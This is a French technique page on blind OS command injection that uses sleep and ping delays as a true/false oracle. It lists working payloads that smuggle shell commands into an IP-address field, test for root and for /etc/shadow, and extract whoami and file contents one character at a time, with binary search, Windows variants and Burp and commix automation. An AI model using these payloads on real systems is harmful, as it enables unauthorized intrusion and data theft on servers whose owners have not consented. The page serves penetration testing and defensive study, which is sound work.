---
title: "Oracle temporel d'injection de commande en aveugle"
description: "Utiliser les délais de sleep et de ping comme oracle booléen dans une injection de commande OS en aveugle pour confirmer l'exécution et extraire des données caractère par caractère lorsqu'il n'existe ni sortie ni canal hors bande."
keywords:
  - injection de commande en aveugle
  - oracle temporel
  - sleep
  - délai de ping
  - extraction de données
  - inférence booléenne
---

# Extraction en aveugle basée sur le temps

Lorsqu'une commande s'exécute en aveugle, sans sortie reflétée et sans canal hors bande disponible (sortie entièrement filtrée, DNS bloqué), un **délai mesurable** devient le seul signal. Forcer le serveur à s'interrompre pendant un intervalle connu transforme le temps de réponse en un oracle d'un bit : lent signifie *vrai*, rapide signifie *faux*. Conditionnez ce délai à une condition et vous pouvez lire les données un caractère à la fois.

## Confirmer l'exécution

Injectez une commande qui bloque pendant un temps fixe et comparez à la réponse de référence :

```
127.0.0.1; sleep 10
127.0.0.1 && sleep 10
127.0.0.1 || sleep 10        # when the first command is made to fail
```

Lorsque `sleep` n'est pas disponible ou est filtré, un `ping` contre la boucle locale produit un délai prévisible :

```
127.0.0.1 & ping -c 10 127.0.0.1      # POSIX: ~10s (one packet/sec)
127.0.0.1 & ping -n 10 127.0.0.1      # Windows: -n, not -c
```

Un bond de dix secondes par rapport à la référence confirme que la commande s'est exécutée. Exécutez chaque test deux fois pour écarter la gigue réseau ; choisissez un délai assez long pour se détacher nettement de la variance normale (5 à 10 s est typique).

## Construire l'oracle booléen

Rendez le délai conditionnel pour qu'il rapporte la véracité d'un test :

```
127.0.0.1; [ $(id -u) -eq 0 ] && sleep 10            # true if running as root
127.0.0.1; [ -f /etc/shadow ] && sleep 10            # true if the file exists
```

Réponse lente = condition vraie ; immédiate = fausse. Cela reflète l'inférence de l'injection SQL en aveugle, appliquée à l'état du shell.

## Extraction caractère par caractère

Combinez l'oracle avec le découpage de chaînes pour récupérer des données sans aucun canal de sortie. Testez une position contre un caractère candidat ; un délai confirme une correspondance :

```
# is the first char of whoami 'r'?
127.0.0.1; [ "$(whoami|cut -c1)" = "r" ] && sleep 10

# walk a file, position by position
127.0.0.1; [ "$(cut -c2 /etc/hostname)" = "p" ] && sleep 10
```

Itérez sur la position `1..n` et le candidat sur le jeu de caractères. Une **recherche dichotomique** sur la valeur de l'octet réduit les ~26 à 95 essais par caractère à ~7, ce qui compte car chaque test coûte un délai complet :

```
127.0.0.1; [ $(printf %d "'$(id|cut -c1)") -gt 109 ] && sleep 10
```

`cut`, `dd`, `head -c` et `${var:offset:len}` découpent tous ; `printf %d "'X"` donne l'ordinal d'un caractère à des fins de comparaison.

## Réduire le coût

L'extraction basée sur le temps est le canal le plus lent, une requête par bit ou par essai. Gardez-la praticable en :

- Utilisant une **recherche dichotomique** sur les ordinaux plutôt que des balayages linéaires du jeu de caractères.
- Utilisant des **délais courts** (2 à 3 s) une fois la variance de référence mesurée.
- **Scriptant** la boucle (Burp Intruder avec un payload de temporisation, ou un petit pilote requests/`curl`) et en lisant le temps écoulé de manière programmatique.
- Restreignant d'abord l'alphabet (est-ce `[a-z]`, `[0-9]`, des majuscules ?) avant de fixer l'octet exact.

## Note sur les plateformes

`sleep` est POSIX ; sous Windows `cmd.exe`, utilisez `ping -n <sec+1> 127.0.0.1` ou `timeout /t <sec>` pour le délai. PowerShell propose `Start-Sleep -s <sec>`.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** Intruder/Repeater, envoyez des payloads temporisés et triez par temps de réponse.
- **[commix](https://github.com/commixproject/commix)**, `--technique=t` automatise l'extraction en aveugle basée sur le temps.

## Références

- [PortSwigger Web Security Academy: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection)
- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
